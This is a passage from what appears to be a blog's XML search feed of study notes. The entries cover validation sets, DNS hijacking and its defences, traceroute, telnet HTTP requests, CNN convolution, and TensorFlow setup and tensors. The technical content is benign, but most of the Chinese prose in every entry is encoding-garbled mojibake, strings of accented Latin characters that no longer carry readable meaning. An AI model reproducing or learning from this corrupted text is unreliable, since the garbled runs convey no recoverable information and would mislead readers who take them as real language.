id="éªŒè¯é›†å‚ä¸äº†è¶…å‚æ•°çš„è®­ç»ƒ">éªŒè¯é›†å‚ä¸äº†è¶…å‚æ•°çš„è®­ç»ƒ</h2><p>åœ¨è®­ç»ƒæ¨¡å‹æ—¶å‚æ•°å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯æ™®é€šçš„æ¨¡å‹å‚æ•°ï¼Œä¸€ç§æ˜¯éœ€è¦äººå·¥è°ƒå‚çš„è¶…å‚æ•°ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“æ™®é€šå‚æ•°çš„è®­ç»ƒä½¿ç”¨çš„æ˜¯è®­ç»ƒé›†çš„æ•°æ®ï¼ŒéªŒè¯é›†çš„æ•°æ®å¹¶æ²¡æœ‰å‚ä¸ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥è¿›è¡Œè¯„ä¼°ã€‚ä½†å®é™…ä¸Šï¼Œæˆ‘ä»¬åœ¨äººå·¥é€‰æ‹©è¶…å‚æ•°ï¼Œå¹¶ä½¿ç”¨éªŒè¯é›†æ¥å†³å®šæœ€ç»ˆä½¿ç”¨å“ªç»„è¶…å‚æ•°çš„è¿‡ç¨‹ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œéªŒè¯é›†å‚ä¸äº†è¶…å‚æ•°çš„è®­ç»ƒè¿‡ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå®Œå…¨æ²¡æœ‰å‚ä¸è¿‡æ‰€æœ‰å‚æ•°è®­ç»ƒçš„æµ‹è¯•é›†æ¥ä½œä¸ºæœ€ç»ˆçš„ç»“æœè¯„ä¼°ã€‚</p><p>å½“è¿‡æ‹Ÿåˆå·²ç»ä¸æ˜¯ä½ çš„ main concernçš„æ—¶å€™å°±å¯ä»¥ä¸åˆ†æ•°æ®ï¼Œå„ç§å¤§æ¨¡å‹éƒ½æ˜¯è¿™æ ·çš„ï¼Œç”¨çš„æ˜¯ç™¾ä¸‡è‡³åäº¿çº§åˆ«çš„æ•°æ®é‡</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS related notes</title>
      <link href="/blog/2021/07/15/network/dns_att_notes/"/>
      <url>/blog/2021/07/15/network/dns_att_notes/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cloudxns.net/Support/detail/id/1839.html">æµè§ˆå™¨DNS ç¼“å­˜çš„æ¸…ç†â€”â€”chrome å’Œ firefox</a> <ahref="https://www.cloudxns.net/Support/detail/id/2503.html">æµ…è°ˆæµè§ˆå™¨ã€æ“ä½œç³»ç»ŸDNS ç¼“å­˜æ—¶é—´</a></p><p><a href="https://www.infoq.cn/article/8QmbXVaBN3EC8VT5itxW">æµ…æ DNSç¼“å­˜æŠ€æœ¯åŠåº”ç”¨è€ƒè™‘</a></p><p><ahref="https://juejin.im/post/5cff858a6fb9a07ed84238ec#heading-9">ä½ éœ€è¦çŸ¥é“çš„â€œDNSåŠ«æŒâ€--web å®‰å…¨ç¯‡</a></p><h2 id="dns-åŠ«æŒæ–¹æ³•">DNS åŠ«æŒæ–¹æ³•</h2><ol type="1"><li>æœ¬æœº DNS åŠ«æŒ</li><li>è·¯ç”±å™¨åŠ«æŒ</li><li>è¿è¥å•†åŠ«æŒ</li><li>DNS æœåŠ¡å™¨è¢«æ”»å…‹</li></ol><p>è§£å†³æ–¹æ¡ˆï¼š</p><p>ç”¨ HTTP DNS ä»£æ›¿ Local DNS</p><p>DoTï¼ˆDNS over TCPï¼‰</p><p>DoHï¼ˆDNS over HTTPï¼‰</p><p>https+DoH/DoT å¯è§£</p><p>åŠ«æŒå¸¸è§ä¸¤ç§ï¼šdns/http</p><p>dns ä¸€èˆ¬ç”¨ tcp å¯ä»¥è§£å†³ï¼ˆè§£å†³æ±¡æŸ“æ˜¯å¦ä¸€ä¸ªè¯é¢˜ï¼‰ï¼Œå€ŸåŠ©å·¥å…·</p><p>http çš„è¯ä¸¤ç§æ–¹æ³•</p><ol type="1"><li>ç»è¿‡ä¸€ä¸ªå¯æ§ proxyï¼Œåœ¨ proxy å†…è¿‡æ»¤è§£å†³</li><li>ç¦æ­¢è·³è½¬ï¼Œæˆ–è€…ç™½åå•ï¼Œè¿™ç§ä¼šå‡ºç°åˆ·æ–°æ‰èƒ½è®¿é—®çš„æƒ…å†µï¼Œä½†é¢‘ç‡å¾ˆä½</li></ol><h2 id="æ¢æµ‹è·¯ç”±è¿‡ç¨‹">æ¢æµ‹è·¯ç”±è¿‡ç¨‹</h2><p>windows ä¸‹çš„ baitracert å’Œ linux/BSD/router ä¸‹çš„ dutracerouteéƒ½ç”¨äºæ¢æµ‹æ•°æ®åŒ…ä»æºåˆ°ç›®çš„ç»è¿‡è·¯ç”±çš„ IPï¼Œä½†ä¸¤è€…æ¢æµ‹çš„æ–¹æ³•å´æœ‰å·®åˆ«daoã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œtracert æ˜¯å‘ç›®çš„åœ°å€å‘å‡º ICMP è¯·æ±‚å›æ˜¾æ•°æ®åŒ…ï¼Œè€Œtraceroute æ˜¯å‘ç›®çš„åœ°å€çš„æŸä¸ªç«¯å£ï¼ˆå¤§äº 30000ï¼‰å‘é€ UDPæ•°æ®æŠ¥ã€‚ä¸¤è€…ç”¨äºæ¢æµ‹çš„æ•°æ®ç±»å‹ä¸åŒã€‚ä½†ä»–ä»¬ä¹Ÿæœ‰ä¸€ä¸ªå…±åŒç‚¹ï¼šéƒ½æ˜¯é€šè¿‡è®¾ç½®å‘é€åŒ…çš„TTL çš„å€¼ä» 1 å¼€å§‹ã€é€æ¬¡å¢ 1 çš„æ–¹æ³•æ¥æ¢æµ‹ã€‚</p><h2 id="å®¢æˆ·ç«¯æ“ä½œç³»ç»Ÿ-dns-æ§åˆ¶">å®¢æˆ·ç«¯ã€æ“ä½œç³»ç»Ÿ DNS æ§åˆ¶</h2><p><a href="https://my.oschina.net/acmfly/blog/60560">é‚ªæ¶çš„æµè§ˆå™¨ DNSç¼“å­˜</a></p><p>nscd - name service cache daemon</p><h2 id="å…¶ä»–">å…¶ä»–</h2><p>å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰æ˜¯ç”Ÿå­˜æœŸé•¿çš„ä¸€ç§è¿›ç¨‹ï¼Œæ²¡æœ‰æ§åˆ¶ç»ˆç«¯ã€‚å®ƒä»¬å¸¸å¸¸åœ¨ç³»ç»Ÿå¼•å¯¼è£…å…¥æ—¶å¯åŠ¨ï¼Œä»…åœ¨ç³»ç»Ÿå…³é—­æ—¶æ‰ç»ˆæ­¢ã€‚UNIXç³»ç»Ÿæœ‰å¾ˆå¤šå®ˆæŠ¤è¿›ç¨‹ï¼Œå®ˆæŠ¤è¿›ç¨‹ç¨‹åºçš„åç§°é€šå¸¸ä»¥å­—æ¯â€œdâ€ç»“å°¾ï¼šä¾‹å¦‚ï¼Œsyslogdå°±æ˜¯æŒ‡ç®¡ç†ç³»ç»Ÿæ—¥å¿—çš„å®ˆæŠ¤è¿›ç¨‹ã€‚é€šè¿‡ ps è¿›ç¨‹æŸ¥çœ‹å™¨ ps -efjçš„è¾“å‡ºå®ä¾‹ï¼Œå†…æ ¸å®ˆæŠ¤è¿›ç¨‹çš„åå­—å‡ºç°åœ¨æ–¹æ‹¬å·ä¸­</p><p>Linux æŸ¥çœ‹æœ¬åœ° DNS æœåŠ¡å™¨:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/resolv.conf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generated by NetworkManager</span></span><br><span class="line">nameserver 202.112.14.21</span><br><span class="line">nameserver 202.112.14.11</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>telnet å‘½ä»¤è¡Œä½¿ç”¨</title>
      <link href="/blog/2021/07/15/network/telnet/"/>
      <url>/blog/2021/07/15/network/telnet/</url>
      
        <content type="html"><![CDATA[<h1 id="telnet">telnet</h1><p>telnet è¿œç¨‹ç»ˆç«¯è®¿é—®ï¼Œåº”ç”¨å±‚åè®®ï¼Œ é»˜è®¤ç«¯å£å·æ˜¯ 23ã€‚</p><h2 id="commandline-usage">commandline usage</h2><p>å‘½ä»¤ï¼š <code>telnet &lt;address&gt; &lt;port&gt;</code> (portä¸å†™ï¼Œé»˜è®¤ä¸º telnet çš„ç«¯å£ 23ï¼‰</p><h3 id="è¿œç¨‹ç™»å½•">è¿œç¨‹ç™»å½•</h3><p><code>telnet &lt;address&gt; &lt;port&gt;</code></p><p>æµ‹è¯•ç½‘ç«™ï¼š</p><p><a href="https://www.telnetbbsguide.com/">telnet bbs</a> <ahref="http://telehack.com/">telehack</a> è¯¥ç½‘ç«™è¿˜æœ‰ <code>Eliza</code>äººå·¥æ™ºèƒ½å¯¹è¯æœºå™¨äººã€‚</p><h3 id="telnet-è·å–ç½‘é¡µ">telnet è·å–ç½‘é¡µ</h3><p>å…¶å®è·å–ç½‘é¡µçš„è¯ï¼Œ curl æ›´å¥½ç”¨ã€‚è¿™é‡Œå°±æ˜¯æä¸€ä¸‹ï¼Œé¡ºä¾¿ç®€å•ç»ƒä¹ ä¸€æ³¢ HTTPçš„æ ¼å¼ã€‚</p><ol type="1"><li><p>Telnet åˆ°ä¸€ä¸ª Web æœåŠ¡å™¨<code>telnet telnet-online.net 80</code></p></li><li><p>é”®ç›˜è¾“å…¥ GET æ–¹æ³•çš„ HTTP è¯·æ±‚æ¶ˆæ¯</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: telnet-online.net</span><br></pre></td></tr></table></figure></p><p>é”®ç›˜è¾“å…¥å,ä¸¤æ¬¡æ•²å›è½¦,ä½ å¯ä»¥å‘é€è¿™ä¸ªæœ€å°é™åº¦çš„ (ä½†å®Œæ•´) GETæ–¹æ³•çš„è¯·æ±‚æ¶ˆæ¯åˆ° HTTP æœåŠ¡å™¨</p></li><li><p>è§‚å¯Ÿ HTTP æœåŠ¡å™¨è¿”å›çš„å“åº”æ¶ˆæ¯</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNN ä¸­çš„å·ç§¯</title>
      <link href="/blog/2021/07/15/ml/cnn/cnn_notes/"/>
      <url>/blog/2021/07/15/ml/cnn/cnn_notes/</url>
      
        <content type="html"><![CDATA[<p>CNN ä¸­çš„ 2D å·ç§¯å®é™…ä¸Šä¸æ˜¯æ•°å­¦çš„å·ç§¯æ“ä½œ,æ˜¯æ•°å­¦æ„ä¹‰ä¸Šçš„äº’ç›¸å…³æ“ä½œ.</p><p>Before we get into some theory, it is important to note that in CNNsalthough we call it a convolution, it is actually cross-correlation. Itis a technicality, but in a CNN we do not flip the filter as is requiredin typical convolutions. However except for this flip, both operationsare identical.</p><p><ahref="https://datascience.stackexchange.com/questions/40533/convolution-and-cross-correlation-in-cnn#:~:text=Before%20we%20get%20into%20some,flip%2C%20both%20operations%20are%20identical.">machinelearning - Convolution and Cross Correlation in CNN - Data Science StackExchange</a></p><p>Actually most practical applications of convolutional neural networks(CNN) use cross-correlation instead of convolutions.</p><p><ahref="https://www.quora.com/Why-do-CNNs-use-convolution-instead-of-cross-correlation">Whydo CNNs use convolution instead of cross-correlation? - Quora</a></p><p>å¤šé¡¹å¼å®é™…ä¸Šæ˜¯ 1D çš„ç¦»æ•£å·ç§¯ã€‚</p><p>ä¸€ç»´ä¿¡å·çº¿æ€§å·ç§¯å¯ä»¥è®¤ä¸ºæ˜¯ä¸€ç§å¤šé¡¹å¼ç›¸ä¹˜ã€‚å·²çŸ¥ä¸¤ä¸ªä¿¡å·å·ç§¯ç»“æœæ˜¯å·²çŸ¥åºåˆ—é™å¹‚æ’åˆ—ç»„æˆçš„å¹‚å‡½æ•°å¤šé¡¹å¼ç›¸ä¹˜å¾—åˆ°çš„å¤šé¡¹å¼ç»“æœçš„é™å¹‚åºåˆ—å€¼ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè®¡ç®—ä¸€ç»´çº¿æ€§å·ç§¯æœ‰ä¸è¿›ä½ä¹˜æ³•è¿™ç§è®¡ç®—æ–¹æ³•çš„åŸå› ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><ahref="https://www.zhihu.com/question/22298352">å¦‚ä½•é€šä¿—æ˜“æ‡‚åœ°è§£é‡Šå·ç§¯ï¼Ÿ- çŸ¥ä¹</a> <ahref="https://math.stackexchange.com/questions/1937630/convolution-and-multiplication-of-polynomials-is-the-same">calculus- Convolution and multiplication of polynomials is the same? -Mathematics Stack Exchange</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä» PyTorch LeNet-5 çœ‹ CNN ç›¸å…³ç¼–ç¨‹</title>
      <link href="/blog/2021/07/15/programming/python/pytorch/torch_cnn/"/>
      <url>/blog/2021/07/15/programming/python/pytorch/torch_cnn/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />TODO</label></li></ul><p><a href="https://blog.51cto.com/u_14481745/5622414">æˆ‘ç”¨ PyTorchå¤ç°äº† LeNet-5 ç¥ç»ç½‘ç»œï¼ˆMNIST æ‰‹å†™æ•°æ®é›†ç¯‡ï¼‰ï¼_51CTO åšå®¢_lenet5å·ç§¯ç¥ç»ç½‘ç»œ pytorch</a></p><h2 id="nn-ä¸-nn.functional-åªæœ‰å°è£…å’Œçµæ´»æ€§çš„åŒºåˆ«">nn ä¸ nn.functionalåªæœ‰å°è£…å’Œçµæ´»æ€§çš„åŒºåˆ«</h2><p><a href="https://www.zhihu.com/question/66782101">PyTorch ä¸­ï¼Œnn ä¸nn.functional æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ - çŸ¥ä¹</a></p><p>ç”¨åœ¨æ—  trainable parameter çš„åœ°æ–¹ç”¨ nn.functional <ahref="https://github.com/soapisnotfat/pytorch-cifar10/blob/master/models/LeNet.py">pytorch-cifar10/models/LeNet.pyat master Â· soapisnotfat/pytorch-cifar10</a></p><ul class="task-list"><li><label><input type="checkbox" /><ahref="https://zhuanlan.zhihu.com/p/38200980">æ·±åº¦å­¦ä¹ ä¸­ Dropout åŸç†è§£æ- çŸ¥ä¹</a></label></li><li><label><input type="checkbox" />cosineä½™å¼¦é€€ç«ç­‰å­¦ä¹ ç‡è°ƒæ•´ç­–ç•¥</label></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> convolution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TensorFlow ç®€ä»‹ä¸ç¯å¢ƒé…ç½®</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_intro_config/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_intro_config/</url>
      
        <content type="html"><![CDATA[<h2 id="x-vs-2.x">1.x vs 2.x</h2><h3 id="æ‰§è¡Œæœºåˆ¶">æ‰§è¡Œæœºåˆ¶</h3><p>TensorFlow 1.x -- å»¶è¿Ÿæ‰§è¡Œæœºåˆ¶ï¼ˆdeferred executionï¼‰</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151658449989.jpg"alt="16151658449989" /><figcaption aria-hidden="true">16151658449989</figcaption></figure><p>åœ¨è®¡ç®—å›¾ä¸­åªä¿å­˜è®¡ç®—è¿‡ç¨‹ï¼Œå¹¶ä¸å®é™…è®¡ç®—ï¼Œå› æ­¤ï¼Œç§°ä¸ºå»¶è¿Ÿè®¡ç®—å›¾/é™æ€å›¾ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªsessionï¼Œåœ¨å…¶ä¸­è¿›è¡Œè®¡ç®—ã€‚</p><p>ç‰¹ç‚¹ï¼š</p><ol type="1"><li>ä»£ç è¿è¡Œæ•ˆç‡é«˜ï¼Œä¾¿äºä¼˜åŒ–</li><li>é™æ€å›¾åªéœ€è¦åˆ›å»ºä¸€æ¬¡ï¼Œå¯ä»¥é‡å¤ä½¿ç”¨ï¼›é™æ€å›¾è¿è¡Œä¹‹å‰ï¼Œå¯ä»¥ä¼˜åŒ–ï¼Œæ•ˆç‡æ›´é«˜ã€‚</li><li>ç¨‹åºä¸å¤Ÿç®€æ´</li></ol><p>Tensorflow 2.x -- åŠ¨æ€å›¾æœºåˆ¶ï¼ˆEager executionï¼‰</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151667742943.jpg"alt="16151667742943" /><figcaption aria-hidden="true">16151667742943</figcaption></figure><ol type="1"><li>æ— éœ€é¦–å…ˆåˆ›å»ºé™æ€å›¾ï¼Œå¯ä»¥ç«‹åˆ»æ‰§è¡Œè®¡ç®—ï¼Œå¹¶è¿”å›ç»“æœ</li><li>èƒ½å¤Ÿå¿«é€Ÿçš„å»ºç«‹å’Œè°ƒè¯•æ¨¡å‹</li><li>æ‰§è¡Œæ•ˆç‡ä¸é«˜</li></ol><p>å¯ä»¥åœ¨ç¨‹åºè°ƒè¯•é˜¶æ®µä½¿ç”¨åŠ¨æ€å›¾ï¼Œå¿«é€Ÿå»ºç«‹æ¨¡å‹ã€è°ƒè¯•ç¨‹åºï¼›åœ¨éƒ¨ç½²é˜¶æ®µï¼Œé‡‡ç”¨é™æ€å›¾æœºåˆ¶ï¼Œä»è€Œæé«˜æ¨¡å‹çš„æ€§èƒ½å’Œéƒ¨ç½²èƒ½åŠ›ã€‚</p><h3 id="api-æ•´åˆ">API æ•´åˆ</h3><p>TensorFlow 1.x -- é‡å¤ã€å†—ä½™çš„ API</p><ol type="1"><li>æ„å»ºç¥ç»ç½‘ç»œï¼štf.slimï¼Œtf.layersï¼Œtf.contrib.layersï¼Œtf.keras</li><li>æ··ä¹±ï¼Œä¸åˆ©äºç¨‹åºå…±äº«ï¼Œç»´æŠ¤çš„æˆæœ¬é«˜</li></ol><p>TensorFlow 2.0 -- æ¸…ç†/æ•´åˆ API</p><ol type="1"><li>æ¸…ç†ã€æ•´åˆäº†é‡å¤çš„ API</li><li>å°† tf.keras ä½œä¸ºæ„å»ºå’Œè®­ç»ƒæ¨¡å‹çš„æ ‡å‡†é«˜çº§ API</li></ol><h3 id="åœ¨-2.x-ä¸­è¿è¡Œ-1.x">åœ¨ 2.x ä¸­è¿è¡Œ 1.x</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import tensorflow.compat.v1 as tf</span><br><span class="line">tf.disable_v2_behavior()</span><br><span class="line">tf.compat.v1.disable_eager_execution()</span><br></pre></td></tr></table></figure><h2 id="tensorflow-ç¯å¢ƒé…ç½®">TensorFlow ç¯å¢ƒé…ç½®</h2><h3 id="åŒ…ç®¡ç†ä¸ç¯å¢ƒç®¡ç†">åŒ…ç®¡ç†ä¸ç¯å¢ƒç®¡ç†</h3><p>conda åŒ…å‘½ä»¤ å®‰è£…åŒ…: conda install <package_name> å¸è½½åŒ…: condaremove <package_name> æ›´æ–°åŒ…ï¼šconda update <package_names>æ¨¡ç³ŠæŸ¥è¯¢ï¼šconda search <text></p><p>é€šå¸¸ä½¿ç”¨ conda è¿›è¡ŒåŒ…ç®¡ç†ï¼Œå¦‚æœé‡åˆ° conda ä¸èƒ½ç®¡ç†ï¼Œå¯ä»¥ä½¿ç”¨ pip</p><h3 id="conda-ç¯å¢ƒç®¡ç†">conda ç¯å¢ƒç®¡ç†</h3><p>conda create --name <env_name><package_names> conda activate<env_name> deactivate conda remove --name <env_name> --all conda envlist</p><p>é…ç½® anaconda æ¸…åå¤§å­¦é•œåƒ å‚è€ƒï¼š<ahref="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/">Anacondaé•œåƒä½¿ç”¨å¸®åŠ©</a></p><h3 id="tensorflow-2.0-å®‰è£…">tensorflow 2.0 å®‰è£…</h3><ol type="1"><li><p>åˆ›å»ºç‹¬ç«‹ç¯å¢ƒï¼Œå¹¶æ¿€æ´»</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create --name rltest python==3.7</span><br><span class="line">conda activate rltest</span><br></pre></td></tr></table></figure></p></li><li><p>å®‰è£…ç›¸å…³è½¯ä»¶åŒ…</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda install numpy matplotlib PIL scikit-learn pandas</span><br><span class="line">pip install numpy matplotlib Pillow scikit-learn pandas -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></p></li><li><p>å®‰è£… tensorflow2.0</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tensorflow==2.0.0-beta -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></p><p>ç”±äº tensorflow ç‰ˆæœ¬ä¸ numpy ç‰ˆæœ¬çš„å…¼å®¹é—®é¢˜ï¼Œå‡ºç°äº† Futurewaringï¼Œå› æ­¤æˆ‘é‡æ–°å®‰è£…äº† <code>pip install "numpy&lt;1.17"</code>,å®‰è£…äº†numpy 1.16.6 ç‰ˆæœ¬</p></li></ol><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><p><ahref="https://github.com/tensorflow/tensorflow/issues/30427">FutureWarning:Deprecated numpy API calls in tf.python.framework.dtypes</a></p></li><li><p><ahref="https://stackoverflow.com/questions/57381430/synonym-of-type-is-deprecated-in-a-future-version-of-numpy-it-will-be-underst">â€œsynonymof type is deprecated; in a future version of numpy, it will beunderstood as (type, (1,)) / '(1,)type'.â€ problem inTensorFlow</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tensorflow common issues</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_issues/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="tensorflow-ä½¿ç”¨-gpu">tensorflow ä½¿ç”¨ gpu</h2><p><a href="media/16152713702364/use_gpu.pdf">tf gpu tutorial</a></p><h2id="è¿è¡Œ-tensorflow-ç»ˆç«¯è¾“å‡ºomp-info-172-kmp_affinity-os-proc-126-maps-to-socket-1-core-30-thread-1">è¿è¡ŒTensorflow ç»ˆç«¯è¾“å‡ºï¼šOMP: Info #172: KMP_AFFINITY: OS proc 126 maps tosocket 1 core 30 thread 1</h2><p>ç»“è®ºï¼šå®ƒåªæ˜¯æ­£å¸¸è¾“å‡ºä¸€äº› OpenMP debugmessagesï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢å‘½ä»¤æŠ‘åˆ¶è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.environ[&quot;KMP_WARNINGS&quot;] = &quot;FALSE&quot;</span><br></pre></td></tr></table></figure><p><ahref="https://stackoverflow.com/questions/57573338/weird-output-when-using-tensorflow-backend-on-keras-omp-info-xx-kmp-affinity">python- Weird output when using TensorFlow backend on Keras (OMP: Info #xxKMP_AFFINITY) - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tensorflow å¼ é‡</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_tensor/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_tensor/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼ é‡åˆ—è¡¨å’Œ-ndarray">å¼ é‡ã€åˆ—è¡¨å’Œ ndarray</h2><p>tensorflow ä¸­çš„ â€œTensorâ€ è¡¨ç¤ºå¼ é‡ï¼Œå…¶å®å°±æ˜¯å¤šç»´æ•°ç»„ã€‚</p><ul><li>Python ä¸­çš„åˆ—è¡¨ list</li><li>NumPy ä¸­çš„æ•°ç»„å¯¹è±¡ ndarray å®ƒä»¬ä¹Ÿéƒ½å¯ä»¥ä½œä¸ºæ•°æ®çš„è½½ä½“</li></ul><p>Python åˆ—è¡¨(list)</p><ol type="1"><li>å…ƒç´ å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®ç±»å‹ï¼Œå¯ä»¥åµŒå¥—</li><li>åœ¨å†…å­˜ä¸­ä¸è¿ç»­å­˜æ”¾ï¼Œæ˜¯ä¸€ä¸ªåŠ¨æ€çš„æŒ‡é’ˆæ•°ç»„</li><li>è¯»å†™æ•ˆç‡ä½ï¼Œå ç”¨å†…å­˜ç©ºé—´å¤§,ä¸é€‚åˆåšæ•°å€¼è®¡ç®—</li></ol><p>numpy æ•°ç»„(array)</p><ol type="1"><li>å…ƒç´ æ•°æ®ç±»å‹ç›¸åŒ</li><li>æ¯ä¸ªå…ƒç´ åœ¨å†…å­˜ä¸­å ç”¨çš„ç©ºé—´ç›¸åŒï¼Œå­˜å‚¨åœ¨ä¸€ä¸ªè¿ç»­çš„å†…å­˜åŒºåŸŸä¸­</li><li>å­˜å‚¨ç©ºé—´å°ï¼Œè¯»å–å’Œå†™å…¥é€Ÿåº¦å¿«åœ¨ CPU ä¸­è¿ç®—ï¼Œä¸èƒ½å¤Ÿä¸»åŠ¨æ£€æµ‹ã€åˆ©ç”¨ GPUè¿›è¡Œè¿ç®—</li></ol><p>tensorflow å¼ é‡(tensor) å¯ä»¥é«˜é€Ÿè¿è¡Œäº GPU å’Œ TPU ä¹‹ä¸Š æ”¯æŒCPUã€åµŒå…¥å¼ã€å•æœºå¤šå¡å’Œå¤šæœºå¤šå¡ç­‰å¤šç§è®¡ç®—ç¯å¢ƒé«˜é€Ÿçš„å®ç°ç¥ç»ç½‘ç»œå’Œæ·±åº¦å­¦ä¹ ä¸­çš„å¤æ‚ç®—æ³•ã€‚</p><p>TensorFlow çš„åŸºæœ¬è¿ç®—ã€å‚æ•°å‘½åã€è¿ç®—è§„åˆ™ã€API çš„è®¾è®¡ç­‰ä¸ NumPyéå¸¸ç›¸è¿‘</p><h2 id="åˆ›å»ºå¼ é‡">åˆ›å»ºå¼ é‡</h2><p>å¼ é‡ç”± Tensor ç±»å®ç°ï¼Œæ¯ä¸€ä¸ªå¼ é‡éƒ½æ˜¯ä¸€ä¸ª Tensor å¯¹è±¡</p><h3 id="tf.constant-å‡½æ•°åˆ›å»ºå¼ é‡">tf.constant() å‡½æ•°ï¼šåˆ›å»ºå¼ é‡</h3><p><code>tf.constant(value, dtype, shape)</code></p><p>valueï¼šæ•°å­—/Python åˆ—è¡¨/NumPy æ•°ç»„ï¼Œæœ€ç»ˆåœ¨ tensor ä¸­è¢«å­˜å‚¨ä¸º numpyæ•°ç»„ dtypeï¼šå…ƒç´ çš„æ•°æ®ç±»å‹ shapeï¼šå¼ é‡çš„å½¢çŠ¶</p><p>å‚æ•°ä¸ºå°æ•°æ—¶ï¼Œé»˜è®¤ä¸º float32 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151704903924.jpg"alt="16151704903924" /></p><p>å¼ é‡.numpy() æ–¹æ³•å¾—åˆ°å¯¹åº”æ•°ç»„</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151713130378.jpg"alt="16151713130378" /><figcaption aria-hidden="true">16151713130378</figcaption></figure><p>å‚æ•°ä¸º numpy æ•°ç»„ numpy åˆ›å»ºæµ®ç‚¹æ•°æ•°ç»„æ—¶ï¼Œé»˜è®¤çš„æµ®ç‚¹å‹æ˜¯ 64ä½æµ®ç‚¹æ•°ã€‚ å½“ä½¿ç”¨ NumPy æ•°ç»„åˆ›å»ºå¼ é‡æ—¶ï¼ŒTensorFlowä¼šæ¥å—æ•°ç»„å…ƒç´ çš„æ•°æ®ç±»å‹ï¼Œä½¿ç”¨ 64 ä½æµ®ç‚¹æ•°ä¿å­˜æ•°æ®ã€‚ GPU å¤„ç† 32ä½æµ®ç‚¹æ•°å¿«ï¼Œè€Œä¸”å¤§éƒ¨åˆ†æƒ…å†µä¸‹ 32 ä½çš„äº¬éƒ½å·²ç»è¶³å¤Ÿäº†ï¼Œå› æ­¤ä½¿ç”¨ numpyæ•°ç»„åˆ›å»ºæ—¶ï¼Œä¸€èˆ¬æŒ‡å®š <code>dtype=tf.float32</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151715477552.jpg"alt="16151715477552" /><figcaption aria-hidden="true">16151715477552</figcaption></figure><p>æ”¹å˜å¼ é‡ä¸­å…ƒç´ çš„æ•°æ®ç±»å‹ï¼š<code>tf.cast(tensor_x, dtype)</code>æ³¨æ„ï¼šè¦ä»ä½ç²¾åº¦å‘é«˜ç²¾åº¦è½¬æ¢ï¼Œå¦åˆ™å¯èƒ½ä¼šå‘ç”Ÿæ•°æ®æº¢å‡ºï¼Œç»“æœå¯èƒ½ä¼šé”™ 